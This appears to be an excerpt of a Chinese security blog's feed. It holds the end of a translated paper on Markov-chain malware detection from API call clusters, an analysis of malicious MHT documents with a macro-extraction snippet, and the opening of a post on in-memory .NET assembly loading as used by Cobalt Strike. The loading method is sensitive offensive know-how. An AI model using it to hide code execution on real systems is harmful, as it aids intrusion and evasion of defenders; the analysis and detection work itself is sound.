class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span></div></pre></td></tr></table></figure></p><p>&nbsp; &nbsp; &nbsp; &nbsp;将API函数序列替换为簇序列是最重要的步骤。<strong>其重要性来自于API函数数量巨大的事实；因此，跟踪恶意软件调用序列中存在的所有API函数变得不可能。通过词嵌入步骤，我们根据上下文相似性表示API函数。当将上下文相似的API函数分组到一个簇中时，我们可以将API函数替换为其包含的簇名称。有了有限数量的簇，</strong>我们就有机会定制恶意软件可能具有的序列组合的可能性。例如，Kietal.(2015)中的恶意软件数据集被分组为10个簇，索引了从恶意软件序列中提取的1165个API函数。API函数数量与簇数量之间的巨大差异大大限制了恶意软件序列可能采取的组合，这简化了分析的可能性。在簇中找到API函数步骤的最终输出是一组簇序列。</p><h4 id="3-3-2-2-创建转移矩阵序列"><a href="#3-3-2-2-创建转移矩阵序列" class="headerlink" title="3.3.2.2 创建转移矩阵序列"></a>3.3.2.2 创建转移矩阵序列</h4><p>&nbsp; &nbsp; &nbsp; &nbsp;在初始化阶段产生的簇可以被视为<strong>有限状态集S</strong>，其中 S = {S1, S2, S3, …, Sn}。提出的模型假设过程（无论是恶意的还是非恶意的）始终处于有限数量的状态，称为<strong>马尔可夫状态</strong>。过程最初从这些状态中的一个开始，并连续移动到另一个状态。每次移动或转换称为一步。当过程从状态Si开始时，它可以以概率 Pij 移动到另一个状态 Sj 作为其下一步。<strong>移动的概率不依赖于链在当前状态之前所处的先前状态。过程也可以根据当前序列在相同状态之间移动或循环。</strong>初始概率分布定义在 S 上，确定起始状态 S0。通常，指定一个特定状态作为起始状态。在本工作中，由于任何状态都可以是起始状态，我们将S0的概率平均分配给模型中已经存在的状态数量。</p><h4 id="3-3-2-3-计算最大转移序列概率"><a href="#3-3-2-3-计算最大转移序列概率" class="headerlink" title="3.3.2.3 计算最大转移序列概率"></a>3.3.2.3 计算最大转移序列概率</h4><p>&nbsp; &nbsp; &nbsp; &nbsp;恶意软件和良性软件转移矩阵是我们模型的核心。给定任何簇序列，簇之间的转移值在良性软件和恶意软件转移矩阵中是区分恶意软件和良性软件的特征。然而，如果我们能够将恶意软件和良性软件的簇序列重新表述为更简单的形式，可能会更容易理解。重新表述的原因是我们想揭示给定序列的遍历行为。换句话说，我们想观察恶意软件的恶意可能性行为和良性软件序列的良性可能性行为。</p><p>&nbsp; &nbsp; &nbsp; &nbsp;为了进行重新表述，我们使用了恶意软件/良性软件簇序列训练集以及恶意软件/良性软件簇转移矩阵。训练集中的每个序列都与两个恶意软件和良性软件簇转移矩阵进行遍历。我们使用公式 (2) 来比较和重新表述每个转移序列，根据其在两个转移矩阵中的转移概率。<br>    <img src="http://hacky.wang/blog/20250113/DnfVo040BXGo.png?imageslim" alt="mark"></p><p>&nbsp; &nbsp; &nbsp; &nbsp;根据公式(2)，如果转移是恶意的，则转移序列被替换为 1，如果是良性软件，则被替换为 0。例如，第 3.3.2.2 节中的簇转移序列根据图3a和4a中的恶意软件/良性软件簇转移矩阵被重新表述如下,我们使用重新表述的恶意软件和良性软件序列来创建描述恶意软件和良性软件的一般模型。再次，我们依赖于最大似然估计来创建恶意软件和良性软件转移模型。恶意软件转移模型描述了重新表述的恶意软件聚类训练序列。同样，良性软件转移模型描述了重新表述的良性软件聚类训练序列。：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>。</div></pre></td></tr></table></figure></p><pre><code>![mark](http://hacky.wang/blog/20250113/mEsiSMF41Phv.png?imageslim)![mark](http://hacky.wang/blog/20250113/k0jR0DSvsVB6.png?imageslim)</code></pre><h3 id="3-3-3-测试阶段"><a href="#3-3-3-测试阶段" class="headerlink" title="3.3.3 测试阶段"></a>3.3.3 测试阶段</h3><p>&nbsp; &nbsp; &nbsp; &nbsp;测试阶段的目标是测量所提出模型在识别和分类未见序列到其类别中的准确性。在此阶段，使用未见的良性软件和恶意软件簇序列对所提出的系统进行测试。簇测试序列作为输入输入到恶意软件和良性软件簇转移矩阵中。每个序列遍历两个转移矩阵，并在从一个状态转移到另一个状态时存储状态转移的概率。当序列遍历结束时，根据公式 (2) 比较恶意软件和良性软件的遍历概率。输出是一个由一和零组成的新序列。将重新表述的序列作为输入输入到恶意软件和良性软件模型中。最终决策是根据从跟踪恶意软件/良性软件转移模型中获得的最大累积似然转移概率来确定的。 让我们用真实的恶意软件和良性软件样本的子序列来测试我们的模型。在示例 1 中，我们的工作针对真实的恶意软件 API 子序列进行测试，而在示例 2 中，我们的工作针对真实的良性软件 API 子序列进行测试。我们使用了图3a 和4a 中的簇转移矩阵以及图5a 和 b 中的恶意软件/良性软件模型.<br>    <img src="http://hacky.wang/blog/20250113/mUV0yIWhS2lz.png?imageslim" alt="mark"></p><p>&nbsp; &nbsp; &nbsp; &nbsp;示例1：给定一个由 Worm.Win32.Zwr.c 产生的API调用子序列：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"lstrcpynA"</span>, <span class="string">"GetThreadLocale"</span>, <span class="string">"GetLocaleInfoW"</span>, <span class="string">"GetLocaleInfoA"</span>, <span class="string">"lstrlenA"</span>, <span class="string">"LoadLibraryExW"</span>, <span class="string">"SearchPathW"</span>, <span class="string">"FindResourceExW"</span>, <span class="string">"LoadResource"</span>, <span class="string">"LoadStringA"</span>, <span class="string">"LocalAlloc"</span>, <span class="string">"VirtualAllocEx"</span></div></pre></td></tr></table></figure></p><p>&nbsp; &nbsp; &nbsp; &nbsp;最初，子序列中存在的每个API函数将在簇中进行搜索。找到后，我们写下包含它的簇。在搜索簇以找到上述子序列中的每个API调用函数后，我们得到了以下簇序列：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">1</span></div></pre></td></tr></table></figure></p><p>&nbsp; &nbsp; &nbsp; &nbsp;我们想知道给定的序列是否具有恶意性。因此，系统将不得不计算以下转移概率，这些概率描述了输入序列：p(1,1), p(1,1), p(1,1), p(1,1), p(1,0), p(0,4), p(4,1), p(1,1), p(1,2), p(2,0), p(0,1)</p><p>&nbsp; &nbsp; &nbsp; &nbsp;步骤1：检查每个转移在恶意软件和良性软件转移矩阵中的转移概率。表2概述了上述簇序列的转移概率追踪。<br>    <img src="http://hacky.wang/blog/20250113/qAeyVRsko53x.png?imageslim" alt="mark"></p><p>&nbsp; &nbsp; &nbsp; &nbsp;步骤2：使用公式 (2) 重新表述簇序列，结果为新序列:1,1,1,1,1,1,1,1,1,0,1</p><p>&nbsp; &nbsp; &nbsp; &nbsp;步骤3：计算新序列相对于恶意软件和良性软件模型的似然性：p(1,1) + p(1,1) + p(1,1) + p(1,1) + p(1,1) + p(1,1) + p(1,1) + p(1,1) + p(1,0) + p(0,1)</p><ul><li>似然性 (序列, 恶意软件) = 0.948 + 0.948 + 0.948 + 0.948 + 0.948 + 0.948 + 0.948 + 0.948 + 0.052 + 0.824 = 8.46。</li><li>似然性 (序列, 良性软件) = 0.322 + 0.322 + 0.322 + 0.322 + 0.322 + 0.322 + 0.322 + 0.322 + 0.678 + 0.066 = 3.32</li></ul><p>&nbsp; &nbsp; &nbsp; &nbsp;步骤4：计算最大似然累积转移值：Max((序列, 恶意软件), (序列, 良性软件)) = Max(8.46, 3.32) = 8.46。因此，该序列被认为是恶意序列。</p><p>&nbsp; &nbsp; &nbsp; &nbsp;示例 2：给定一个由 AriaMaestosaSetup-1.4.13.exe产生的API调用子序列：<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"PeekMessageW"</span>, <span class="string">"MsgWaitForMultipleObjects"</span>, <span class="string">"MessageBoxW"</span>, <span class="string">"LoadStringW"</span>, <span class="string">"GetSystemMetrics"</span>, <span class="string">"ExitWindowsEx"</span>, <span class="string">"DispatchMessageW"</span>, <span class="string">"DestroyWindow"</span>, <span class="string">"CharUpperBuffW"</span>, <span class="string">"CallWindowProcW"</span>, <span class="string">"WriteFile"</span>, <span class="string">"WideCharToMultiByte"</span></div></pre></td></tr></table></figure></p><p>&nbsp; &nbsp; &nbsp; &nbsp;以下表示是上述原始 API 调用序列的簇序列：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">7</span></div></pre></td></tr></table></figure></p><p>&nbsp; &nbsp; &nbsp; &nbsp;在搜索簇找到上述子序列中的每个API调用函数后，我们得到以下簇序列：5,5,5,5,5,5,5,9,9,5,9.</p><p>&nbsp; &nbsp; &nbsp; &nbsp;现在，我们想知道给定的子序列是否具有恶意性。系统将不得不计算以下转移概率，这些概率描述了输入序列：p(5,5), p(5,5), p(5,5), p(5,5), p(5,5), p(5,5), p(5,9), p(9,9), p(9,5), p(5,9), p(9,5).</p><p>&nbsp; &nbsp; &nbsp; &nbsp;步骤1：检查每个转移在恶意软件和良性软件转移矩阵中的转移概率。表3概述了上述簇序列的转移概率追踪。<br>    <img src="http://hacky.wang/blog/20250113/jRxTPCK67618.png?imageslim" alt="mark"></p><p>&nbsp; &nbsp; &nbsp; &nbsp;步骤2：使用公式 (2) 重新表述簇序列，结果为新序列：0,0,0,0,0,0,0,0,0,0,0</p><p>&nbsp; &nbsp; &nbsp; &nbsp;步骤3：计算新序列相对于恶意软件和良性软件模型的似然性：输入序列：p(0,0) + p(0,0) + p(0,0) + p(0,0) + p(0,0) + p(0,0) + p(0,0) + p(0,0) + p(0,0) + p(0,0)</p><ul><li>似然性(序列, 恶意软件) = 0.176 + 0.176 + 0.176 + 0.176 + 0.176 + 0.176 + 0.176 + 0.176 + 0.176 + 0.176 = 1.76</li><li>似然性 (序列, 良性软件) = 0.935 + 0.935 + 0.935 + 0.935 + 0.935 + 0.935 + 0.935 + 0.935 + 0.935 + 0.935 = 9.35</li></ul><p>&nbsp; &nbsp; &nbsp; &nbsp;步骤 4：计算最大累积转移值：Max((序列, 恶意软件), (序列, 良性软件)) = Max(1.76, 9.35) = 9.35</p><p>&nbsp; &nbsp; &nbsp; &nbsp;因此，该序列被认为是良性软件序列。</p><h1 id="4-结果与讨论"><a href="#4-结果与讨论" class="headerlink" title="4. 结果与讨论"></a>4. 结果与讨论</h1><p>&nbsp; &nbsp; &nbsp; &nbsp;在本节中，我们展示了使用不同数据集的评估。我们评估了我们的模型正确检测和预测给定 API 调用序列是否具有恶意性的能力。</p><h2 id="4-1-数据集"><a href="#4-1-数据集" class="headerlink" title="4.1 数据集"></a>4.1 数据集</h2><p>&nbsp; &nbsp; &nbsp; &nbsp;为了验证我们的方法，我们收集了多个API调用序列。我们的实验使用了不同大小的不同数据集。大多数作者没有提供他们使用的数据集的访问权限，或者他们提供的 URL 链接已经不再有效。因此，收集恶意软件和良性软件的数据集并非易事。我们注意到，作者只提供恶意软件 API 调用序列数据集，而忽略了提供良性软件 API 调用序列，如 Ki et al. (2015), Catak and Yazı (2019)。为了比较恶意软件和良性软件的行为执行，有必要拥有良性软件 API 调用序列数据集。因此，我们从开源平台如 Github 提供了一些可用的良性软件 API 调用序列数据集，以进行恶意软件和良性软件行为执行的比较。表 4 列出了数据集的详细信息，包括其大小和描述。</p><h2 id="4-2-评估指标"><a href="#4-2-评估指标" class="headerlink" title="4.2 评估指标"></a>4.2 评估指标</h2><p>&nbsp; &nbsp; &nbsp; &nbsp;我们依赖于准确率、精确率、召回率和 F1 分数等评估指标来评估我们提出模型的性能。这些评估指标的计算公式如下：<br>    <img src="http://hacky.wang/blog/20250113/EuswhsHw5Obu.png?imageslim" alt="mark"></p><h2 id="4-3-恶意软件检测评估"><a href="#4-3-恶意软件检测评估" class="headerlink" title="4.3 恶意软件检测评估"></a>4.3 恶意软件检测评估</h2><p>&nbsp; &nbsp; &nbsp; &nbsp;在我们的实验中，我们选择了 50% 的数据作为训练集，保留剩余的 50% 用于测试。在训练中，我们依赖于随机子样本（有放回），这类似于 k 折交叉验证策略；然而，在每次迭代中，我们随机选择一些样本用于训练，一些其他样本用于测试。这种方法的优势在于我们可以自由决定迭代次数和每次训练-测试的长度。为了防止训练偏差，实验运行了十次。我们将十次实验返回的结果的平均值作为每个数据集的最终评估指标。</p><p>&nbsp; &nbsp; &nbsp; &nbsp;为了验证我们提出的工作，我们使用了两个额外的评估指标。这些指标是受混淆矩阵启发的，混淆矩阵是一个描述分类方法性能的表格。评估指标是假正例率 (FPR) 和假负例率 (FNR)。FPR 是错误预测类别的指示因子，FNR 是错误负向分类类别的指示因子。</p><p>&nbsp; &nbsp; &nbsp; &nbsp;实验结果显示，我们的方法返回了高准确率的恶意软件检测率，误报率极低。如表 5 所示，我们的方法返回了平均精确率准确率为 0.990，平均假正例率为 0.010，平均假负例率为 0.010。结果表明，我们的模型在检测和分类未见恶意软件方面具有很高的效率和准确性。</p><p>【余下评估内容不作翻译】</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>&nbsp; &nbsp; &nbsp; &nbsp;在本文的词嵌入步骤中，所使用的簇似乎过于少，这样就导致样本API的泛化效果不好，例如写入文件(CreateFile+WriteFile),以及读取文件(CreateFile+ReadFile)，其中WriteFile和ReadFile不应该归属到一个簇中。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文为：&lt;a href=&quot;https://www.sciencedirect.com/science/article/abs/pii/S0167404820300444#:~:text=In%20this%20paper%2C%20we%20introduce%20the%20use%20of,exists%20between%20API%20functions%20in%20malware%20call%20sequences.&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.sciencedirect.com/science/article/abs/pii/S0167404820300444#:~:text=In%20this%20paper%2C%20we%20introduce%20the%20use%20of,exists%20between%20API%20functions%20in%20malware%20call%20sequences.&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="AI安全" scheme="https://findream.github.io/categories/AI%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>MHT样本分析与威胁狩猎感悟</title>
    <link href="https://findream.github.io/2024/07/08/MHT%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2024/07/08/MHT样本分析/</id>
    <published>2024-07-08T07:02:11.000Z</published>
    <updated>2024-07-08T13:28:14.956Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;近期，我们在日常APT狩猎的过程中，关联到一个特殊的MHT文件，巧合的是该文件和公司另外一个团队披露的国产办公软件0day相关联的文档是同一个(同一类)。该恶意样本为MHT格式，鉴于我们对该类型文件缺乏认识，特此总结。</p><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MHT文档又称为聚合HTML文档、Web档案或单一文件网页。MHT文档可以由浏览器和Office软件创建。因此，在野攻击事件中，攻击者偶尔使用MHT文档作为载体发起鱼叉和水坑攻击。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从结构上来讲，MHT文件是由multipart组成的，类型有text/html、text/css、application/octet-stream、image等，每个multipart可使用base64进行编码。</p><h4 id="样例1-针对Office的攻击样本分析"><a href="#样例1-针对Office的攻击样本分析" class="headerlink" title="样例1 针对Office的攻击样本分析"></a>样例1 针对Office的攻击样本分析</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;APT32组织在2017年使用maldoc_office.htm(<a href="https://www.virustotal.com/gui/file/1210384a9d0ca2e089efab14f2e9f6d55a3824031c1e589b96f854fb96411288" target="_blank" rel="external">ce50e544430e7265a45fab5a1f31e529</a>)作为攻击入口载荷，内嵌VBS代码作为后续的攻击向量。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;观察maldoc_office.htm文件，发现其内部存在4个可疑的multipart对象，其中一个MIME-TYPE为“application/vnd.ms-officetheme”，可知这是一个office主题，还有两个MIME-TYPE为“image/png”，这是两个图片，另外最值得可疑的是一个“application/x-mso”的类型。将该类型的Base64进行解码，然后在偏移为0x32往后的内容实用gzip解码。就会生成ole对象，然后使用olevba即可查看宏代码。<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">data</span> = base64.b64decode(<span class="title">editdata</span>)</span></div><div class="line"><span class="title">with</span> open(<span class="string">"decode.bin"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> fp:</div><div class="line">fp.write(zlib.decompress(<span class="class"><span class="keyword">data</span>[50:]))</span></div></pre></td></tr></table></figure></p><p><img src="http://hacky.wang/blog/20240708/e7MDFnGtvPMa.png?imageslim" alt="mark"></p><h4 id="样例2-MalDoc-In-PDF"><a href="#样例2-MalDoc-In-PDF" class="headerlink" title="样例2 MalDoc In PDF"></a>样例2 MalDoc In PDF</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://ata.360.net/report/476502040414208" target="_blank" rel="external">1d97e352ae420aae5b3db5c151e7458d</a>实际上还是一个MHT文件，使用PDF查看工具打开会失败，通过工具查看，同样可以看到里面存在一个类型为“application/x-mso”的multipart对象。<br><img src="http://hacky.wang/blog/20240708/Agyf4eFB0C62.png?imageslim" alt="mark"></p><h4 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们在观察日志信息的时候，如果进程明显是文档软件的进程，并且拉起了可疑的子进程，第一考虑的应该是文档存在宏的情况，第二应该考虑的是漏洞的情况，而不是考虑白加黑利用的情况，尤其进程又在原始安装目录下面，这其实就是认知不足造成的。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还有就是，例如MalDoc In PDF，这个在去年日本研究员就提出来了，自己也跟进了，但是自己思想上没有跟进，MHT可以使用word打开，wps应该也可以打开，这样就存在可以被利用的攻击面，但是我们在狩猎的时候，并没有把这个考虑进去，就失去了发现这个0D的机会。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;近期，我们在日常APT狩猎的过程中，关联到一个特殊的MHT文件，巧合的是该文件和公司另外一个团队披露的国产办公软件0day相关联的文档是同一个(同一类)。该恶意样本为MHT格式，鉴于我们对该类型文件缺乏认识，特此总结。&lt;/p&gt;
    
    </summary>
    
      <category term="威胁狩猎" scheme="https://findream.github.io/categories/%E5%A8%81%E8%83%81%E7%8B%A9%E7%8C%8E/"/>
    
    
  </entry>
  
  <entry>
    <title>Execute-Assembly 攻守之道</title>
    <link href="https://findream.github.io/2023/04/02/Execute-Assembly%E6%94%BB%E5%AE%88%E4%B9%8B%E9%81%93/"/>
    <id>https://findream.github.io/2023/04/02/Execute-Assembly攻守之道/</id>
    <published>2023-04-02T12:45:11.000Z</published>
    <updated>2023-05-02T07:22:31.803Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Execute-Assembly-原理"><a href="#0x01-Execute-Assembly-原理" class="headerlink" title="0x01 Execute-Assembly 原理"></a>0x01 Execute-Assembly 原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在《Cobalt Strike 原理分析》一文中，介绍了内存加载程序集(Assembly)的主要有四步：</p><ul><li>1&gt; 加载CLR环境</li><li>2&gt; 获取程序域</li><li>3&gt; 装载程序集</li><li>4&gt; 执行程序集</li></ul><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在odzhan的<a href="https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/" target="_blank" rel="external">Shellcode: Loading .NET Assemblies From Memory</a>所描述的那样，.Net Framework随着版本的更新，使用了不同的接口，.Net Framework V1.0 采用的是<code>ICorRuntimeHost接口</code>，支持v1.0.3705, v1.1.4322, v2.0.50727和v4.0.30319。到了.Net Framework v2.0，采用<code>ICLRRuntimeHost接口</code>，支持v2.0.50727和v4.0.30319。然后到了.Net Framework v4.0，则使用了<code>ICLRMetaHost接口</code>,但是可能不再兼容4.0以下的.Net Framework。所以使用<code>ICLRMetaHost接口</code>并不是一个非常合适的接口。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们可以使用多个函数进行接口的实例化，最常见的可能属<code>CoCreateInstance</code>或者<code>CLRCreateInstance</code>。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">CoInitializeEx以及CoCreateInstance</div><div class="line">CorBindToRuntime或者CorBindToRuntimeEx</div><div class="line"><span class="built_in">CLRCreateInstance</span>以及ICLRRuntimeInfo</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;剩下的关于<code>获取程序域</code>,<code>装载程序集</code>,以及<code>执行程序集</code>在<a href="https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization" target="_blank" rel="external">Execute-Assembly实现</a>都有具体实现。完整代码如下。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div 